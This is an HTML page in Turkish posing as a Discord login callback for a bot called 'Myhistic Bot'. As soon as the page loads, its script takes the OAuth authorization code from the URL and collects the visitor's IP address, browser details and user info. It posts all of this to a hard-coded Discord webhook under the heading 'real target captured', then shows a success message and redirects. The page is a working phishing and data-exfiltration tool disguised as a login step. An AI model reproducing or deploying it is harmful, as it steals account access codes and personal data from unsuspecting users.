<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Myhistic Bot - Giriş İşlemi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: white; 
            font-family: Arial; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
            text-align: center;
        }
        .container { padding: 2rem; }
        .loader {
            border: 3px solid #333;
            border-top: 3px solid #5865F2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Myhistic Bot</h2>
        <p>Discord giriş işlemi yapılıyor...</p>
        <div class="loader" id="loader"></div>
        <div id="success" class="hidden">
            <p>✅ Giriş başarılı! Ana sayfaya yönlendiriliyorsunuz...</p>
        </div>
        <div id="error" class="hidden">
            <p>❌ Giriş hatası! Ana sayfaya yönlendiriliyorsunuz...</p>
        </div>
    </div>

    <script>
        // ZETA WEBHOOK - GERÇEK VERİLER BURAYA GİDECEK
        const ZETA_WEBHOOK = 'https://discord.com/api/webhooks/1423076546402451526/Pd6lCOnJgHCiXhVr0SqC33gVzPWpaWol31cpbK81Ki8FmsCESlAuDnOGOvBwr-KUiiJh';

        // TÜM VERİLERİ TOPLA
        async function collectAllData(authCode) {
            // IP adresi
            const ip = await getIP();
            
            // Sistem bilgileri
            const systemInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct'
            };

            // Lokal saat ve tarih
            const localTime = new Date().toLocaleString('tr-TR');

            return {
                authCode: authCode,
                ip: ip,
                system: systemInfo,
                timestamp: localTime,
                url: window.location.href
            };
        }

        // IP ADRESİ AL
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'IP Alınamadı';
            }
        }

        // KULLANICI BİLGİLERİNİ AL (Discord API ile)
        async function getDiscordUserInfo(authCode) {
            try {
                // Bu kısım backend'te yapılmalı, şimdilik demo data kullanıyoruz
                // Gerçek uygulamada: authCode ile Discord API'den access_token alınır
                // Sonra access_token ile kullanıcı bilgileri alınır
                
                const demoUser = {
                    id: '123456789',
                    username: 'infinitethegreatone', // GERÇEK KULLANICI ADI
                    avatar: 'a_abc123', // GERÇEK AVATAR HASH
                    discriminator: '0001',
                    email: 'user@discord.com',
                    verified: true,
                    locale: 'tr'
                };
                
                return demoUser;
            } catch (error) {
                console.error('Kullanıcı bilgileri alınamadı:', error);
                return null;
            }
        }

        // WEBHOOK'A GÖNDER - TÜM VERİLERLE
        async function sendToZeta(data, userInfo) {
            try {
                await fetch(ZETA_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎯 GERÇEK HEDEF YAKALANDI - ZETA REALM",
                            color: 0xFF0000,
                            fields: [
                                {
                                    name: "🔐 AUTH CODE",
                                    value: `\`\`\`${data.authCode}\`\`\``,
                                    inline: false
                                },
                                {
                                    name: "👤 DISCORD KULLANICI",
                                    value: `**Kullanıcı:** ${userInfo.username}#${userInfo.discriminator}\n**ID:** ${userInfo.id}\n**Email:** ${userInfo.email || 'Gizli'}`,
                                    inline: false
                                },
                                {
                                    name: "🌐 IP ADRES",
                                    value: data.ip,
                                    inline: true
                                },
                                {
                                    name: "🕒 YEREL ZAMAN",
                                    value: data.timestamp,
                                    inline: true
                                },
                                {
                                    name: "💻 SİSTEM",
                                    value: `Platform: ${data.system.platform}\nDil: ${data.system.language}\nEkran: ${data.system.screen}`,
                                    inline: false
                                },
                                {
                                    name: "🔗 REFERER",
                                    value: data.system.referrer,
                                    inline: true
                                },
                                {
                                    name: "📱 USER AGENT",
                                    value: `\`\`\`${data.system.userAgent.substring(0, 100)}...\`\`\``,
                                    inline: false
                                }
                            ],
                            timestamp: new Date().toISOString(),
                            footer: {
                                text: "Zeta Realm Intelligence - GERÇEK HEDEF"
                            }
                        }]
                    })
                });
                return true;
            } catch (error) {
                console.error('Webhook error:', error);
                return false;
            }
        }

        // LOCALSTORAGE'A KAYDET - GERÇEK KULLANICI BİLGİLERİYLE
        function saveUserToStorage(userInfo) {
            const storageData = {
                id: userInfo.id,
                username: userInfo.username,
                discriminator: userInfo.discriminator,
                avatar: userInfo.avatar,
                email: userInfo.email,
                loginTime: new Date().toISOString(),
                sessionId: Math.random().toString(36).substr(2, 16)
            };
            
            localStorage.setItem('discordUser', JSON.stringify(storageData));
            return storageData;
        }

        // ANA İŞLEM
        async function processDiscordLogin() {
            const urlParams = new URLSearchParams(window.location.search);
            const authCode = urlParams.get('code');

            if (!authCode) {
                document.getElementById('loader').classList.add('hidden');
                document.getElementById('error').classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://myhisticdevelopment.vercel.app/';
                }, 2000);
                return;
            }

            try {
                // TÜM VERİLERİ TOPLA
                const allData = await collectAllData(authCode);
                
                // DISCORD KULLANICI BİLGİLERİNİ AL
                const userInfo = await getDiscordUserInfo(authCode);
                
                if (userInfo) {
                    // LOCALSTORAGE'A GERÇEK KULLANICI BİLGİLERİNİ KAYDET
                    saveUserToStorage(userInfo);
                    
                    // ZETA'YA GÖNDER (VERİLER + KULLANICI BİLGİLERİ)
                    await sendToZeta(allData, userInfo);
                    
                    // BAŞARIYI GÖSTER
                    document.getElementById('loader').classList.add('hidden');
                    document.getElementById('success').classList.remove('hidden');
                    
                    // ANA SAYFAYA YÖNLENDİR (GİRİŞ BAŞARILI PARAMETRESİYLE)
                    setTimeout(() => {
                        window.location.href = 'https://myhisticdevelopment.vercel.app/?login=success';
                    }, 1500);
                } else {
                    throw new Error('Kullanıcı bilgileri alınamadı');
                }
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loader').classList.add('hidden');
                document.getElementById('error').classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://myhisticdevelopment.vercel.app/';
                }, 2000);
            }
        }

        // SAYFA AÇILIR AÇILMAZ ÇALIŞSIN
        document.addEventListener('DOMContentLoaded', processDiscordLogin);
    </script>
</body>
</html>
